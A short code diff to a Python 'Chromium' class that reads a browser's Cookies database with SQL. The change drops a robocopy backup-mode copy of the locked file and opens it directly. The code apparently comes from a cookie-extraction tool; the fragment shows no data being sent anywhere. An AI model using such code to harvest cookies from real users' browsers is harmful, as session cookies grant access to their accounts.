@@ -244,12 +244,7 @@ class Chromium:
             print(f"[{self.__browser_name}]: No cookies file found")
             return
 
-        destination = file_path.replace("Cookies", "Cookies (copy)")
-        
-        subprocess.run(["robocopy", file_path, destination, "/B"], shell=True)
-
-        
-        cursor, connection = self._get_db_connection(destination)
+        cursor, connection = self._get_db_connection(file_path)
         cookies_list = cursor.execute(self.__config.CookiesSQL).fetchall()
 
         cursor.close()
